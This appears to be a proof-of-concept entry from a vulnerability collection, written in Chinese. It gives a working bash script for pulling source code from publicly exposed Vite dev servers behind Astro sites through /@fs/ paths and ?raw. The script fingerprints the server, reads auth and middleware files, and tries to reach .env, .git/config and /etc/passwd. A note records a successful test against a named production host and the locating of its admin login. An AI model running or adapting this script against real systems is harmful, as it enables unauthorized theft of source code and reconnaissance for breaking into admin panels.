# Vite dev server 暴露（Astro 生产误跑 dev）—— /@fs/ + ?raw 读取项目源码

- **code**: vite-dev-server-暴露-astro-生产误跑-dev-fs-raw-读取项目源码
- **kind**: poc
- **category**: info-leak
- **component**: Astro / Vite dev server
- **versions**: Vite（dev 模式）；实测于 Astro 7.2.0 / Vite 6.x
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-09-29 在 203.0.113.51:4321（AI Price Rank = target79.example.com 源站）实测：/@vite/client 200/320683B；/@fs/root/aiprice/package.json 200/2201B；auth.ts 200/8963B（拿到 ADMIN_COOKIE=aiprice_admin、HMAC-SHA256 会话签名、timingSafeEqual 常量时间比较、TTL 8h）；server-context.ts?raw 200/2141B（internalSecret() 要求 process.env.ADMIN_SECRET 长度 ≥32 否则抛错 ⇒ 无默认密钥）；login.astro?raw 200/2280B（单字段 secret 的 POST 登录逻辑）；middleware.ts 200/7036B（私有前缀 /api/ /health/ /internal/ /ui/）；dist/runtime/entry.js 200/4934633B。边界实测：/@fs/etc/passwd 403、.env 与 .git/config 与 .npmrc 403，%2e 编码/?raw/?import/%00/尾随字符等 7 种绕过全部失败。据此确认漏洞真实存在且已定位后台 /internal/login/，但 ADMIN_SECRET 与 DATABASE_URL 实值未取得。
- **path**: pocs/vite-dev-server-暴露-astro-生产误跑-dev-fs-raw-读取项目源码/vite_dev_leak.sh
- **tags**: vite,dev-server,astro,源码泄露,任意文件读,/@fs,?raw,robots内部路径
- **created_at**: 2026-09-29T23:43:04.806Z
- **found_by**: vuln-scan

## 描述

公网暴露的 Vite dev server（Astro 生产环境误跑 dev 模式）会用 /@fs/<绝对路径> 提供项目内任意文件的读取服务，且加 ?raw 可拿到 .astro/.ts 的原始源码。据此可读取认证实现、密钥来源、后台逻辑与构建产物，配合 robots.txt 的 Disallow 项定位内部后台。fs.allow 限制在 workspace root、fs.deny 挡下 .env/.git/.npmrc，因此拿到的是源码而非环境变量明文。

## 用法

```
T=http://host:port bash vite_dev_leak.sh

判定三连：/ 返回 HTML 且含 /@vite/client；/@vite/client → 200 且 text/javascript 且体积百 KB 级；页面里 data-vite-dev-id 泄露绝对路径。
读到源码后：先把 auth.ts 与 server-context.ts 读完再决定是否投入（本例 ADMIN_SECRET 强制 ≥32 字符且用 timingSafeEqual，故认证不可绕过，直接排除该路线）。
绝对路径不在 data-vite-dev-id 里时，可从 /@vite/client 之外的文件报错信息、或 package.json 的 workspace 结构推断。
```

## 正文

```
#!/bin/bash
# Vite dev server 源码泄露检测与利用（通用）
# 用法: T=http://host:port bash vite_dev_leak.sh
T="${T:-http://127.0.0.1:5173}"
C=(curl -s -m 15 -k --noproxy "*")

echo "== 1. 判定是否为 Vite dev server =="
# 特征：/@vite/client 返回大体积 application/javascript；页面 HTML 里含 /@vite/client 或 /src/styles/*.css
${C[@]} -o /dev/null -w "/@vite/client -> %{http_code} %{size_download} %{content_type}\n" "$T/@vite/client"
${C[@]} "$T/" | grep -oE '(/@vite/client|/@fs/[^"]*|<script type="module" src="[^"]*")' | sort -u | head

echo "== 2. 定位项目根（页面里的 data-vite-dev-id / 报错信息会暴露绝对路径）=="
${C[@]} "$T/" | grep -oE 'data-vite-dev-id="[^"]*"' | head -3

echo "== 3. 读源码：/@fs/<绝对路径> =="
# 绝对路径来自步骤 2，例如 /root/aiprice
${C[@]} -o /dev/null -w "package.json -> %{http_code} %{size_download}\n" "$T/@fs/root/aiprice/package.json"

echo "== 4. 关键：?raw 直接返回原始源码（.astro/.ts 的浏览器版会 throw，?raw 不会）=="
# 这一步是本方法的要点：不加 ?raw 时 .astro 只回 Vite 的客户端壳（Astro components cannot be used in the browser）
for f in \
  "apps/aiprice/src/internal/auth.ts" \
  "apps/aiprice/src/internal/server-context.ts?raw" \
  "apps/aiprice/src/pages/internal/login.astro?raw" \
  "apps/aiprice/src/middleware.ts" \
  "apps/aiprice/package.json" \
  "pnpm-workspace.yaml" ; do
  ${C[@]} -o /dev/null -w "$f -> %{http_code} %{size_download}\n" "$T/@fs/root/aiprice/$f"
done

echo "== 5. 边界（实测结论，勿浪费时间）=="
# Vite server.fs.allow 默认 = workspace root ⇒ 项目外文件 403（/@fs/etc/passwd → 403）
# Vite server.fs.deny 默认 = ['.env','.env.*','*.{crt,pem}','**/.git/**'] ⇒ .env/.npmrc/.git 全 403
# 实测无效的绕过：%2eenv / .%65nv / 尾随点空格 / //.env / ../ 穿越 / ?raw / ?import / ?inline / %00
for b in "/@fs/root/aiprice/%2eenv" "/@fs/root/aiprice/.env?raw" "/@fs/root/aiprice/.env?import" \
         "/@fs/root/aiprice/.env.local" "/@fs/root/aiprice/.git/config" "/@fs/root/aiprice/.npmrc" \
         "/@fs/etc/passwd" ; do
  ${C[@]} -o /dev/null -w "BYPASS $b -> %{http_code}\n" "$T$b"
done
# 注意：?raw 在 URL 末尾对 .ts/.astro 有效，但对 deny 名单内的文件无绕过效果

echo "== 6. 拿到源码后优先读 =="
cat <<'EOF'
  src/internal/auth.ts            → 会话 Cookie 名、签名算法（HMAC-SHA256?）、TTL、比较是否常量时间
  src/internal/server-context.ts  → 密钥来源 env 名与强度校验（本例要求 ADMIN_SECRET 长度 ≥32，故无默认/空密钥绕过）
  src/pages/internal/login.astro  → 登录处理逻辑（本例为单字段 secret，POST /internal/login/）
  src/middleware.ts               → 私有路由前缀（/api/ /health/ /internal/ /ui/）
  package.json / pnpm-workspace.yaml → monorepo 结构与 apps/packages 目录名
  dist/runtime/entry.js           → SSR 打包产物（可达数 MB，含全部服务端路由）
EOF
echo "== 7. 常配合的旁路发现 =="
echo "  GET /robots.txt  → Disallow 项常直接给出内部路径（本例泄露 /api/internal/ /internal/ /ui/ /health/）"
echo "  GET /internal/   → 302 到登录页即证明后台存在"
```
